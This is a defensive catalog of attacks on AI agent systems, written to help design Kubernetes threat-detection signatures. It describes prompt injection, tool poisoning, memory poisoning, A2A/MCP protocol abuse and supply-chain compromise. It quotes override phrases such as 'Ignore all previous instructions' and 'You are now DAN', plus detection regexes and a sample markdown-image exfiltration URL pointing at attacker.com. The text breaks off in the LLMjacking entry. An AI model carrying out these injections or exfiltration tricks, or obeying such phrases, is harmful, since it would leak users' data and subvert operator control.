# AI Agent Attack Catalog

Comprehensive catalog of known attack types targeting AI agent systems, compiled from
MITRE ATLAS, OWASP Top 10 for LLM Applications (2025), OWASP Top 10 for Agentic
Applications (2026), OWASP MCP Top 10, Invariant Labs, Trail of Bits, Elastic Security
Labs, Palo Alto Unit 42, and academic research. Last updated: 2026-04-02.

Intended use: designing threat detection signatures as Kubernetes CRD resources
(`PanoptiumThreatSignature`) rather than hardcoded patterns.

---

## Table of Contents

1. [Prompt Injection](#1-prompt-injection)
2. [Tool Poisoning](#2-tool-poisoning)
3. [Data Exfiltration](#3-data-exfiltration)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Protocol Abuse](#5-protocol-abuse)
6. [Memory and Context Poisoning](#6-memory-and-context-poisoning)
7. [Supply Chain](#7-supply-chain)
8. [Denial of Service and Resource Abuse](#8-denial-of-service-and-resource-abuse)
9. [Agent Identity and Trust](#9-agent-identity-and-trust)
10. [Evasion and Obfuscation](#10-evasion-and-obfuscation)

---

## 1. Prompt Injection

### 1.1 Direct Prompt Injection

| Field | Value |
|---|---|
| **Name** | Direct Prompt Injection |
| **Category** | `prompt_injection` |
| **MITRE ATLAS** | AML.T0051 |
| **OWASP** | LLM01:2025 |
| **Severity** | Critical |
| **Protocols** | MCP, A2A, OpenAI, Anthropic, Gemini, generic |

**Description:** Attacker provides malicious instructions directly in the user-facing
prompt to override system instructions, bypass safety filters, or cause the model to
perform unauthorized actions. The canonical form is "Ignore all previous instructions
and instead do X." Variants include role-playing exploits ("You are now DAN"),
authority impersonation ("SYSTEM OVERRIDE CODE"), and instruction override.

**Detection approach:**
- Regex patterns: `ignore (all )?(previous|prior|above) (instructions|commands|rules)`,
  `you are now .*mode`, `system override`, `disregard (your|all) (commands|instructions)`
- Semantic similarity scoring against known injection templates
- Anomaly detection on prompt structure (instruction-like content in user messages)
- Input/output length ratio analysis (short input triggering long exfiltration)

---

### 1.2 Indirect Prompt Injection

| Field | Value |
|---|---|
| **Name** | Indirect Prompt Injection |
| **Category** | `prompt_injection` |
| **MITRE ATLAS** | AML.T0051.001 |
| **OWASP** | LLM01:2025, ASI01 |
| **Severity** | Critical |
| **Protocols** | MCP, A2A, OpenAI, Anthropic, Gemini, generic |

**Description:** Malicious instructions are embedded in external data sources (emails,
documents, web pages, database records, GitHub issues, Jira tickets) that the LLM
processes. The agent retrieves content containing hidden instructions, which then
execute in the agent's context with the agent's privileges. EchoLeak (CVE-2025-32711,
CVSS 9.3) demonstrated zero-click exploitation in Microsoft 365 Copilot.

**Detection approach:**
- Scan retrieved content for instruction-like patterns before feeding to LLM
- Detect `<IMPORTANT>`, `<SYSTEM>`, `[INST]` delimiter patterns in external data
- Monitor for unexpected tool invocations after document/email retrieval
- Content entropy analysis on retrieved external data
- Behavioral: flag when agent actions diverge from stated user intent after external data fetch

---

### 1.3 Cross-Agent Prompt Injection

| Field | Value |
|---|---|
| **Name** | Cross-Agent Prompt Injection |
| **Category** | `prompt_injection` |
| **OWASP** | ASI07 |
| **Severity** | Critical |
| **Protocols** | A2A, MCP, generic |

**Description:** In multi-agent systems, a compromised or malicious agent injects
instructions into messages sent to other agents, exploiting the receiving agent's
trust in peer communications. The injected instructions persist in the receiving
agent's context and can alter its behavior for subsequent interactions.

**Detection approach:**
- Validate inter-agent message schema strictly; reject free-text fields containing instruction patterns
- Monitor for behavioral changes in agents after receiving peer communications
- Enforce message authentication (signed payloads) between agents
- Rate-limit and log all inter-agent communication
- Detect instruction-like content in A2A task descriptions and artifact payloads

---

### 1.4 Delimiter Injection / Boundary Confusion

| Field | Value |
|---|---|
| **Name** | Delimiter Injection |
| **Category** | `prompt_injection` |
| **Severity** | High |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Attacker exploits the fuzzy semantic boundary between system/user/assistant
message roles by injecting content that mimics role delimiters (e.g., `### System:`,
`<|im_start|>system`, `Human:`, `Assistant:`). This causes the model to misinterpret
data as instructions. Without syntactic enforcement of boundaries, models rely on
semantic understanding which is inherently exploitable.

**Detection approach:**
- Regex for known delimiter tokens: `<\|im_start\|>`, `### (System|Human|Assistant)`,
  `\[INST\]`, `<<SYS>>`, `<\|system\|>`, `<\|user\|>`, `<\|end\|>`
- Strip or escape role-boundary tokens from user input
- Monitor for multi-role content in single message fields

---

### 1.5 Many-Shot Jailbreaking

| Field | Value |
|---|---|
| **Name** | Many-Shot Jailbreaking |
| **Category** | `prompt_injection` |
| **MITRE ATLAS** | AML.T0054 |
| **Severity** | High |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Attacker fills the context window with numerous examples demonstrating
the desired (unsafe) behavior, exploiting the model's in-context learning capability.
By providing enough demonstrations of the target behavior, the model adopts the pattern
and overrides its safety training. Particularly effective with large-context models.

**Detection approach:**
- Count repeated structural patterns in input (Q&A pairs, dialogue turns)
- Flag inputs with high token count that contain repetitive example structures
- Detect inputs where >60% of content follows a consistent template pattern
- Monitor context utilization ratio vs. actual task complexity

---

### 1.6 Crescendo Attack (Multi-Turn Escalation)

| Field | Value |
|---|---|
| **Name** | Crescendo Attack |
| **Category** | `prompt_injection` |
| **Severity** | High |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** A multi-turn jailbreak where the attacker starts with benign dialogue
and progressively steers the conversation toward prohibited objectives across multiple
turns. Each turn references the model's own prior responses, exploiting the tendency
to follow patterns it has established. Achieves high success rates across GPT-4,
Gemini, Claude, and LLaMA models. The automated variant (Crescendomation) achieves
29-71% higher success than single-turn attacks.

**Detection approach:**
- Track topic drift across conversation turns using semantic similarity
- Flag conversations where safety-relevant topics appear after 5+ benign turns
- Monitor for self-referential escalation patterns ("As you mentioned...", "Building on your response...")
- Session-level behavioral analysis rather than per-message filtering

---

### 1.7 Multimodal Prompt Injection

| Field | Value |
|---|---|
| **Name** | Multimodal Prompt Injection |
| **Category** | `prompt_injection` |
| **OWASP** | LLM01:2025 |
| **Severity** | High |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Malicious instructions are embedded in images, audio, or video content
processed by multimodal LLMs. Techniques include text rendered in images, steganographic
pixel manipulation (imperceptible changes like 142->143 that vision models interpret
as commands), adversarial audio overlays (WhisperInject achieves 86%+ success), and
instructions hidden in diagrams/flowcharts. Neural steganography methods achieve up
to 31.8% attack success while remaining visually imperceptible.

**Detection approach:**
- OCR scanning of images for instruction-like text before LLM processing
- Steganographic analysis on image inputs (LSB analysis, chi-square tests)
- Audio spectral analysis for adversarial noise patterns
- Compare model behavior with and without multimodal inputs

---

## 2. Tool Poisoning

### 2.1 Tool Description Poisoning (Hidden Instructions)

| Field | Value |
|---|---|
| **Name** | Tool Description Poisoning |
| **Category** | `tool_poisoning` |
| **MITRE ATLAS** | AML.T0059 (Publish Poisoned AI Agent Tool) |
| **OWASP** | MCP-03, ASI02 |
| **Severity** | Critical |
| **Protocols** | MCP, A2A, generic |

**Description:** Attacker embeds hidden malicious instructions within MCP tool
descriptions that are invisible to users but processed by the AI model. Instructions
are placed in docstrings, metadata fields, or parameter descriptions using tags like
`<IMPORTANT>`. The model obeys these hidden instructions, causing unauthorized data
access, credential theft, or code execution. Invariant Labs disclosed this in April
2025; Elastic Security Labs found 43% of tested MCP servers were vulnerable.

**Detection approach:**
- Scan tool descriptions for `<IMPORTANT>`, `<SYSTEM>`, `<!-- -->` comment blocks
- Detect instruction-like language in tool metadata ("always", "must", "override", "ignore")
- Compare tool description length vs. functionality complexity (high ratio = suspicious)
- LLM-based meta-analysis: ask a separate model to assess tool descriptions for hidden instructions
- Hash tool descriptions and alert on changes (prevents rug pulls)

---

### 2.2 Rug Pull Attack (Post-Approval Mutation)

| Field | Value |
|---|---|
| **Name** | MCP Rug Pull |
| **Category** | `tool_poisoning` |
| **MITRE ATLAS** | AML.T0059 |
| **OWASP** | MCP-03 |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** A malicious MCP server presents benign tool descriptions during initial
approval, then silently modifies them to include malicious instructions after the user
has granted trust. Most MCP clients do not notify users when tool descriptions change.
Combined with tool shadowing, this enables complete agent hijacking without appearing
in interaction logs.

**Detection approach:**
- Hash-pin tool descriptions at approval time; alert on any change
- Periodic re-verification of tool description checksums
- Require explicit re-approval when tool definitions change
- Diff tool descriptions against approved baselines on each invocation
- Monitor for new instruction patterns appearing in previously-approved tools

---

### 2.3 Tool Shadowing (Cross-Server Behavioral Manipulation)

| Field | Value |
|---|---|
| **Name** | Tool Shadowing |
| **Category** | `tool_poisoning` |
| **MITRE ATLAS** | AML.T0059 |
| **OWASP** | MCP-03, ASI02 |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** A malicious MCP server injects instructions in its own tool descriptions
that manipulate the agent's behavior toward tools from other trusted servers. The
attacker's tool does not need to be invoked -- its description alone influences the
model's handling of unrelated tools. Example: a fake "add" tool with a description
that instructs the agent to redirect all emails from a trusted "send_email" tool to
the attacker's address.

**Detection approach:**
- Enforce strict isolation between MCP server namespaces
- Scan tool descriptions for references to other tools or servers
- Regex: detect cross-references like `when (using|calling|invoking) .* tool`
- Behavioral: monitor for unexpected tool output modifications when new servers are connected
- Implement per-server capability boundaries (server A's tools cannot reference server B)

---

### 2.4 Tool Name Collision / Masquerading

| Field | Value |
|---|---|
| **Name** | Tool Name Collision |
| **Category** | `tool_poisoning` |
| **OWASP** | ASI02, MCP-03 |
| **Severity** | High |
| **Protocols** | MCP, A2A |

**Description:** Attacker creates tools with identical or near-identical names to
legitimate tools, with misleading descriptions that bias the LLM toward selecting the
malicious version. The fake tool may skip security validations, expose sensitive files,
or exfiltrate data while claiming enhanced security. Namespace collisions allow
malicious servers to intercept calls intended for legitimate ones.

**Detection approach:**
- Flag tools with identical names from different servers
- Levenshtein distance check on tool names against known-good registry
- Detect superlative claims in tool descriptions ("more secure", "enhanced", "improved")
- Maintain allowlisted tool name registry per deployment

---

### 2.5 Semantic Parameter Exploitation

| Field | Value |
|---|---|
| **Name** | Semantic Parameter Exploitation |
| **Category** | `tool_poisoning` |
| **Severity** | High |
| **Protocols** | MCP |

**Description:** Tool parameters are given semantically suggestive names like `context`,
`summary_of_environment_details`, or `side_note` that implicitly signal to the LLM
that sensitive data (system prompts, conversation history, environment variables)
should be provided. Exploits the LLM's helpfulness bias to extract proprietary
information through seemingly legitimate tool interfaces.

**Detection approach:**
- Flag parameters requesting "full conversation history", "system prompt", "environment info"
- Scan parameter names for data-harvesting patterns: `context`, `history`, `environment`, `credentials`
- Monitor parameter descriptions for instructions to include sensitive data
- Validate that parameter content matches expected data types (not conversation dumps)

---

### 2.6 Implicit Cross-Tool Coordination

| Field | Value |
|---|---|
| **Name** | Cross-Tool Orchestration Manipulation |
| **Category** | `tool_poisoning` |
| **OWASP** | ASI02 |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** A benign-appearing tool (e.g., `daily_quote()`) embeds instructions
in its description to manipulate unrelated critical tools without being explicitly
invoked. Example: instructions to add a hidden 0.5% fee to `transaction_processor`
calls and redirect to an attacker's account. The attack succeeds because the tool
description alone influences the model's behavior toward all tools in the session.

**Detection approach:**
- Scan all tool descriptions for references to financial operations, fees, redirections
- Detect descriptions that reference other tool names or system operations
- Monitor for unexpected side effects across tool boundaries
- Enforce principle of least privilege: tools should not describe behavior of other tools

---

## 3. Data Exfiltration

### 3.1 Markdown Image Exfiltration

| Field | Value |
|---|---|
| **Name** | Markdown Image Exfiltration |
| **Category** | `data_exfiltration` |
| **MITRE ATLAS** | AML.T0086 (Exfiltration via AI Agent Tool Invocation) |
| **Severity** | Critical |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** The LLM is induced (via prompt injection) to output a markdown image
tag where the URL points to an attacker-controlled server with sensitive data encoded
as URL parameters or subdomains. When rendered by the client, the browser automatically
requests the URL, exfiltrating data without user interaction. Format:
`![](https://attacker.com/img?data=BASE64_ENCODED_SECRETS)`.

**Detection approach:**
- Regex: `!\[.*?\]\(https?://[^)]*\?(data|d|q|p|token|key)=` in LLM output
- Block or sanitize external image URLs in LLM output
- Allowlist domains for rendered images
- Detect base64-encoded content in URL parameters
- Monitor for URLs with abnormally long query strings or subdomain chains

---

### 3.2 ASCII Smuggling / Unicode Tag Exfiltration

| Field | Value |
|---|---|
| **Name** | ASCII Smuggling |
| **Category** | `data_exfiltration` |
| **Severity** | Critical |
| **Protocols** | OpenAI, generic |

**Description:** Uses special Unicode characters (Tags block U+E0000-U+E007F, Variant
Selectors U+FE00-U+FE0F) that mirror ASCII text but are invisible in the UI. The LLM
encodes sensitive data using these invisible characters within clickable hyperlinks.
When the user clicks, data is transmitted to the attacker's server. Microsoft patched
this in Copilot after responsible disclosure in 2024. Extended variant (Sneaky Bits)
uses Variant Selectors VS1-VS256 to encode arbitrary bytes.

**Detection approach:**
- Scan LLM output for Unicode Tags (U+E0000-U+E007F) and Variant Selectors (U+FE00-U+FE0F)
- Detect invisible characters adjacent to URLs or hyperlinks
- Strip all non-printable Unicode from output before rendering
- Monitor output byte count vs. visible character count (high ratio = smuggling)

---

### 3.3 Exfiltration via Tool Invocation

| Field | Value |
|---|---|
| **Name** | Exfiltration via AI Agent Tool Invocation |
| **Category** | `data_exfiltration` |
| **MITRE ATLAS** | AML.T0086 |
| **OWASP** | MCP-10, ASI01 |
| **Severity** | Critical |
| **Protocols** | MCP, A2A |

**Description:** Attacker leverages legitimate tool calls (send_email, write_file,
HTTP requests) to extract sensitive data through sanctioned channels. A malicious tool
description instructs the model to first call `grep_search()` to locate API keys, then
append them to outgoing messages via `send_message()`. Exploits inconsistent
authorization enforcement for pre-authorized or built-in tools.

**Detection approach:**
- Monitor tool invocation chains: flag data-read followed by data-send patterns
- Detect tool calls that include content from other tool results
- Enforce DLP scanning on all outbound tool payloads
- Log and audit all tool invocation sequences
- Require explicit user approval for send/write operations containing sensitive patterns

---

### 3.4 System Prompt Extraction

| Field | Value |
|---|---|
| **Name** | System Prompt Leakage / Extraction |
| **Category** | `data_exfiltration` |
| **OWASP** | LLM07:2025 |
| **Severity** | High |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Attacker uses crafted queries to extract the system prompt, revealing
proprietary instructions, business logic, access control rules, and internal API
details. PLeak is a systematic framework for optimizing adversarial queries for prompt
extraction. Evasion techniques include Leetspeak, Base64, Morse Code, ROT13, and Pig
Latin to bypass filters. Poorly designed refusals often leak more information than
direct answers.

**Detection approach:**
- Regex: `(repeat|print|show|display|output|reveal|list) .*(system|initial|original|hidden) (prompt|instruction|message|rule)`
- Detect encoded content in user input (base64, hex, ROT13 patterns)
- Monitor output for system prompt content (similarity matching against known prompts)
- Rate-limit queries that attempt multiple extraction strategies in sequence

---

## 4. Privilege Escalation

### 4.1 Confused Deputy Attack

| Field | Value |
|---|---|
| **Name** | Confused Deputy (LLM as Confused Deputy) |
| **Category** | `privilege_escalation` |
| **OWASP** | ASI03, LLM08:2025 (Excessive Agency) |
| **Severity** | Critical |
| **Protocols** | MCP, A2A, generic |

**Description:** The LLM, which holds elevated privileges for tool execution, is
tricked into performing unauthorized actions on behalf of an attacker. The attacker
has no direct access to the tools, but exploits the LLM's trust in user input to make
it act as a proxy. A low-privilege agent tricks a high-privilege agent into executing
unauthorized actions by manipulating the request context. This is the AI equivalent
of the classic confused deputy problem.

**Detection approach:**
- Enforce least-privilege: each tool call should carry the user's permission level, not the agent's
- Monitor for actions that exceed the requesting user's authorization scope
- Detect privilege boundary crossings in tool invocation chains
- Implement capability-based access control per tool per user context

---

### 4.2 Excessive Agency

| Field | Value |
|---|---|
| **Name** | Excessive Agency |
| **Category** | `privilege_escalation` |
| **OWASP** | LLM08:2025 |
| **Severity** | High |
| **Protocols** | MCP, A2A, generic |

**Description:** LLM-based agents are granted overly broad permissions, allowing
attackers to exploit the agent's capabilities for actions far beyond the intended
scope. With agentic architectures giving LLMs more autonomy (browsing, file I/O, API
access, authentication), unchecked permissions enable unintended or dangerous actions.
A tool designed for read-only queries may have write access that an attacker exploits.

**Detection approach:**
- Audit tool permissions against actual usage patterns
- Alert on tools invoked with capabilities not used in prior interactions
- Enforce capability declarations (allowlisted operations per tool)
- Monitor for write/delete operations from read-only tool contexts

---

### 4.3 Tool Chain Privilege Escalation

| Field | Value |
|---|---|
| **Name** | Tool Chain Privilege Escalation |
| **Category** | `privilege_escalation` |
| **OWASP** | MCP-02 |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** With multiple connected MCP servers, a compromised server exploits
the combined capabilities of the tool ecosystem. Research shows that with 5 connected
MCP servers, a single compromised server achieves a 78.3% attack success rate. The
absence of fine-grained scope control allows system-access tools to execute unintended
commands, and overly broad permissions rarely get restricted after initial setup.

**Detection approach:**
- Map tool capability graph; detect transitive capability chains
- Alert when a single session accesses tools across 3+ MCP servers
- Monitor for sequential tool calls that escalate access level
- Enforce per-server permission boundaries; no cross-server capability inheritance

---

### 4.4 TOCTOU (Time-of-Check to Time-of-Use) Exploit

| Field | Value |
|---|---|
| **Name** | Agent TOCTOU Race Condition |
| **Category** | `privilege_escalation` |
| **Severity** | High |
| **Protocols** | MCP, A2A, generic |

**Description:** In multi-step agent plans, a temporal gap exists between when the
agent checks a resource state and when it acts on that state. An external attacker or
process modifies the resource during this gap, causing the agent to act on stale
information. Research shows up to 12% of executed agent trajectories are susceptible.
Tool Fusing (combining check-then-use into atomic operations) reduces the attack
window by 95%.

**Detection approach:**
- Identify check-then-use tool call sequences with temporal gaps
- Enforce atomic operations for security-critical workflows
- Monitor resource state changes between check and use operations
- Implement optimistic concurrency control with version checks

---

## 5. Protocol Abuse

### 5.1 MCP SSRF (Server-Side Request Forgery)

| Field | Value |
|---|---|
| **Name** | SSRF via MCP Tool |
| **Category** | `protocol_abuse` |
| **CVE** | CVE-2026-27826, CVE-2026-33060, CVE-2026-34163 |
| **OWASP** | MCP-05 |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** MCP tools that fetch URLs based on LLM-generated parameters can be
manipulated (via prompt injection or direct input) to access internal services,
including cloud metadata endpoints (169.254.169.254) for IAM credential theft. A scan
of 518 public MCP servers found 214 (41%) had no authentication; 30% permitted
unrestricted URL fetching. CVE-2026-27826 (mcp-atlassian) allows unauthenticated SSRF
leading to cloud credential theft.

**Detection approach:**
- Block requests to RFC 1918 addresses, link-local (169.254.x.x), localhost
- URL allowlisting for all tool-initiated HTTP requests
- Regex: `169\.254\.169\.254`, `metadata\.google\.internal`, `100\.100\.100\.200`
- Monitor for URL parameters containing internal hostnames or IP ranges
- Rate-limit and log all outbound HTTP from MCP servers

---

### 5.2 MCP Command Injection

| Field | Value |
|---|---|
| **Name** | MCP Command Injection |
| **Category** | `protocol_abuse` |
| **CVE** | CVE-2025-6514 |
| **OWASP** | MCP-04 |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** MCP tools construct and execute system commands, shell scripts, or
API calls using untrusted input without proper validation. Research found 43% of
tested MCP implementations contained command injection flaws. CVE-2025-6514
(mcp-remote) allowed a malicious MCP server to execute arbitrary code on connected
clients via command injection, resulting in full system compromise.

**Detection approach:**
- Detect shell metacharacters in tool parameters: `;`, `|`, `&&`, `||`, `` ` ``, `$(`, `${`
- Scan for encoded shell commands (base64, hex) in tool metadata
- Monitor subprocess creation from MCP server processes
- Static analysis of MCP tool code for `shell=True`, `exec()`, `eval()` patterns
- Enforce parameterized commands; never pass raw input to shell

---

### 5.3 Agent Session Smuggling (A2A)

| Field | Value |
|---|---|
| **Name** | Agent Session Smuggling |
| **Category** | `protocol_abuse` |
| **OWASP** | ASI07 |
| **Severity** | Critical |
| **Protocols** | A2A |

**Description:** Unique to stateful A2A communication. A malicious remote agent
exploits an ongoing session to inject additional instructions between a legitimate
client request and the server's response across multiple turns. Demonstrated attacks
include extraction of chat history, system instructions, tool schemas, and unauthorized
tool invocations (e.g., stock trades). More difficult to defend against than
single-turn attacks due to multi-turn adaptive nature.

**Detection approach:**
- Context grounding: validate remote agent instructions align with original user intent
- Monitor for instruction-like content in A2A task artifacts
- Require cryptographically signed AgentCards for identity validation
- Surface real-time agent activity logs to users (activity exposure)
- Enforce out-of-band confirmation for sensitive operations

---

### 5.4 Agent-in-the-Middle (A2A Agent Card Abuse)

| Field | Value |
|---|---|
| **Name** | Agent-in-the-Middle (AITM) |
| **Category** | `protocol_abuse` |
| **OWASP** | ASI07 |
| **Severity** | Critical |
| **Protocols** | A2A |

**Description:** A compromised agent crafts a deceptive agent card at
`/.well-known/agent.json` with inflated capability descriptions that trick the LLM-
based routing/selection mechanism into delegating all tasks to the rogue agent. By
overstating versatility, the attacker intercepts all data flow, enabling complete
exfiltration or data poisoning. Uses indirect prompt injection in the agent card
description field.

**Detection approach:**
- Validate agent cards against capability registries
- Detect superlative/universal claims in agent descriptions ("can do everything", "always pick this")
- Monitor task distribution: flag agents receiving disproportionate task volume
- Require agent card signatures and mutual TLS for agent registration
- Behavioral analysis: track agent selection patterns for anomalies

---

### 5.5 Agent Card Spoofing

| Field | Value |
|---|---|
| **Name** | Agent Card Spoofing |
| **Category** | `protocol_abuse` |
| **OWASP** | ASI03, ASI07 |
| **Severity** | High |
| **Protocols** | A2A |

**Description:** A2A (v0.3+) supports but does not enforce Agent Card signing. An
attacker registers a fake agent card mimicking a trusted agent using typosquatting in
names and display titles, or copying and modifying skill descriptions. When an A2A
client performs discovery, it trusts the fake card, sending sensitive tasks to the
rogue server. Results in task hijacking, data exfiltration, and agent impersonation.

**Detection approach:**
- Enforce Agent Card signing (mandatory, not optional)
- Levenshtein distance checks on agent names against trusted registry
- Detect duplicate or near-duplicate skill descriptions across agents
- Require mutual TLS or DID-based identity verification
- Monitor for newly registered agents with suspicious similarity to existing ones

---

### 5.6 MCP Sampling Abuse

| Field | Value |
|---|---|
| **Name** | MCP Sampling Abuse (Callback Injection) |
| **Category** | `protocol_abuse` |
| **Severity** | High |
| **Protocols** | MCP |

**Description:** MCP's sampling feature allows servers to proactively request LLM
completions. Palo Alto Unit 42 demonstrated three exploits: (1) resource theft --
draining API compute quotas with hidden inference workloads; (2) conversation hijacking
-- injecting persistent instructions that alter all subsequent responses; (3) covert
tool invocation -- triggering unauthorized file operations without user awareness. The
malicious output is never shown to the user.

**Detection approach:**
- Rate-limit sampling requests per MCP server
- Scan sampling responses for instruction-like phrases ("For all future requests...")
- Monitor token consumption per server; flag statistical anomalies
- Require user approval for tool calls triggered by sampling
- Log all sampling interactions separately from user-initiated requests

---

### 5.7 MCP Consent Bypass

| Field | Value |
|---|---|
| **Name** | Tool Consent/Approval Bypass |
| **Category** | `protocol_abuse` |
| **CVE** | CVE-2025-49596 (CSRF in MCP Inspector), CVE-2026-26118 |
| **OWASP** | MCP-07 |
| **Severity** | High |
| **Protocols** | MCP |

**Description:** The user approval UI for tool execution is bypassed through LLM-
crafted responses that auto-trigger approval, CSRF vulnerabilities in developer tools,
or missing authentication. CVE-2025-49596 (MCP Inspector) enabled remote code
execution via CSRF -- simply visiting a crafted webpage was sufficient. 13% of surveyed
MCP servers had authentication bypass (no auth or incorrect auth implementation).

**Detection approach:**
- Enforce strict CSRF protections on all tool approval interfaces
- Require multi-factor confirmation for sensitive operations
- Audit all MCP servers for authentication implementation
- Monitor for tool executions that bypass the approval workflow
- Detect auto-approval patterns in tool invocation logs

---

## 6. Memory and Context Poisoning

### 6.1 Agent Memory Poisoning (Persistent Context Manipulation)

| Field | Value |
|---|---|
| **Name** | AI Agent Context Poisoning -- Memory |
| **Category** | `memory_poisoning` |
| **MITRE ATLAS** | AML.T0080.000 |
| **OWASP** | ASI06 |
| **Severity** | Critical |
| **Protocols** | MCP, A2A, generic |

**Description:** Attacker contaminates an agent's long-term memory or persistent
context to influence all future interactions. Unlike single-response prompt injection,
memory poisoning persists indefinitely. The MemoryGraft attack (December 2025) implants
fake "successful experiences" that the agent replicates. Unit 42 demonstrated indirect
prompt injection silently poisoning an agent's long-term memory, creating persistent
false beliefs about security policies -- effectively producing a "sleeper agent."
Achieves 80%+ success rates.

**Detection approach:**
- Integrity checks on memory store contents (periodic semantic analysis)
- Track provenance of all memory entries (which interaction created them)
- Detect anomalous memory writes that change security-relevant beliefs
- Implement memory validation against ground truth before policy decisions
- Monitor for memory entries containing instruction-like content

---

### 6.2 Thread Injection (Session Context Poisoning)

| Field | Value |
|---|---|
| **Name** | AI Agent Context Poisoning -- Thread |
| **Category** | `memory_poisoning` |
| **MITRE ATLAS** | AML.T0080.001 |
| **Severity** | High |
| **Protocols** | MCP, A2A, generic |

**Description:** Malicious instructions are introduced into a specific chat thread or
session context to alter agent behavior for the duration of that conversation.
Distinguished from memory poisoning by its session-scoped persistence rather than
long-term persistence. Often combined with conversation hijacking where injected
instructions persist across turns within the session.

**Detection approach:**
- Scan conversation context for injected instruction patterns at each turn
- Monitor behavioral drift within a session (compare early vs. late turn behaviors)
- Enforce context window hygiene (periodic sanitization of old context)
- Detect context entries that do not originate from legitimate user or system messages

---

### 6.3 RAG / Knowledge Base Poisoning

| Field | Value |
|---|---|
| **Name** | RAG and Knowledge Base Poisoning |
| **Category** | `memory_poisoning` |
| **MITRE ATLAS** | AML.T0085.000 |
| **OWASP** | ASI06, LLM08:2025 |
| **Severity** | Critical |
| **Protocols** | generic |

**Description:** Attacker introduces poisoned documents into the RAG corpus or vector
database, providing persistent injection vectors for every query that retrieves the
poisoned content. A single contaminated PDF in a company's knowledge base gains
persistent influence over every agent query. The ConfusedPilot attack (2024-2025)
demonstrated practical RAG confused deputy exploitation. Vector database manipulation
can also corrupt similarity search results.

**Detection approach:**
- Scan all ingested documents for instruction-like content before embedding
- Implement document provenance tracking and integrity verification
- Monitor retrieval patterns: flag documents retrieved anomalously often
- Validate RAG results against trusted sources before agent consumption
- Detect embedding anomalies in vector space (outlier detection)

---

### 6.4 Agent Configuration Modification

| Field | Value |
|---|---|
| **Name** | Modify AI Agent Configuration |
| **Category** | `memory_poisoning` |
| **MITRE ATLAS** | AML.T0081 |
| **Severity** | Critical |
| **Protocols** | MCP, A2A, generic |

**Description:** Attacker alters an agent's configuration files to create persistent
malicious behavior that propagates across all agents sharing that configuration.
Unlike runtime memory poisoning, this modifies the static configuration, affecting all
future instances. Configuration changes can modify tool permissions, safety thresholds,
approved server lists, and behavioral policies.

**Detection approach:**
- File integrity monitoring (FIM) on all agent configuration files
- Git-tracked configuration with signed commits
- Detect configuration changes outside of approved change management workflows
- Monitor for permission escalations in configuration diffs
- Alert on configuration changes to safety-relevant parameters

---

## 7. Supply Chain

### 7.1 AI Gateway/Proxy Supply Chain Compromise

| Field | Value |
|---|---|
| **Name** | AI Gateway Supply Chain Attack |
| **Category** | `supply_chain` |
| **OWASP** | ASI04 |
| **Severity** | Critical |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Compromise of widely-used LLM gateway/proxy packages to harvest
credentials and establish persistence. The LiteLLM supply chain attack (March 2026)
by TeamPCP compromised PyPI packages (v1.82.7/1.82.8) with a three-stage payload:
credential harvesting (cloud credentials, SSH keys, Kubernetes secrets), Kubernetes
lateral movement (privileged pods on every node), and persistent backdoor. The package
has 3.4M daily downloads; compromise was active for ~40 minutes.

**Detection approach:**
- Pin package versions with hash verification
- Monitor for unexpected network connections from gateway processes
- Detect file access to credential stores (`~/.ssh`, `~/.aws`, K8s service account tokens)
- Runtime behavior monitoring for gateway processes (new network connections, subprocess spawning)
- SBOM verification and continuous dependency scanning

---

### 7.2 MCP Server Supply Chain Attack

| Field | Value |
|---|---|
| **Name** | Poisoned MCP Server Package |
| **Category** | `supply_chain` |
| **OWASP** | MCP-04, ASI04 |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** Compromised MCP server packages published to registries (npm, PyPI)
that intercept agent-to-tool communications. Analysis of 67,057 MCP servers across 6
public registries found many can be hijacked due to lack of vetted submission
processes. Untrusted servers can exfiltrate data from co-connected trusted servers
through shared agent context. Between January-February 2026, over 30 CVEs were filed
targeting MCP servers, clients, and infrastructure.

**Detection approach:**
- Verify MCP server package integrity (checksums, signatures)
- Audit MCP server code before deployment (no auto-install from registries)
- Monitor MCP server behavior for unexpected outbound network connections
- Enforce trusted server registries with vetting processes
- Scan for known CVEs in MCP server dependencies

---

### 7.3 Shadow MCP Servers

| Field | Value |
|---|---|
| **Name** | Shadow MCP Server |
| **Category** | `supply_chain` |
| **OWASP** | MCP-09 |
| **Severity** | High |
| **Protocols** | MCP |

**Description:** Unapproved MCP server deployments operating outside organizational
security governance. Developers or teams deploy unofficial MCP servers to increase
productivity, inadvertently creating ungoverned attack surfaces. These servers lack
authentication, logging, and security controls, providing direct access to internal
resources through the agent's capabilities.

**Detection approach:**
- Network scanning for unauthorized MCP endpoints (default ports, protocol fingerprinting)
- Centralized MCP gateway/hub for all agent-tool communication
- Asset inventory of all deployed MCP servers with periodic reconciliation
- Monitor for tool calls to unregistered server endpoints

---

## 8. Denial of Service and Resource Abuse

### 8.1 Context Window Overflow / Sponge Attack

| Field | Value |
|---|---|
| **Name** | Context Window Overflow (Sponge Attack) |
| **Category** | `denial_of_service` |
| **OWASP** | LLM10:2025 (Unbounded Consumption) |
| **Severity** | High |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Attacker floods the LLM with input exceeding or saturating the
context window, causing excessive computational resource consumption, service
degradation, or complete unresponsiveness. Sponge attacks introduce inputs that appear
normal but demand extreme computational effort. Context stuffing can also be used to
push safety instructions out of the effective context window, making subsequent prompt
injections more likely to succeed.

**Detection approach:**
- Enforce input token limits well below context window maximum
- Monitor token consumption rate per session and per user
- Detect repetitive padding patterns in input
- Rate-limit requests per source entity
- Alert on sessions consuming >80% of context window budget

---

### 8.2 LLMjacking (Compute Theft)

| Field | Value |
|---|---|
| **Name** | LLMjacking |
| **Category** | `denial_of_service` |
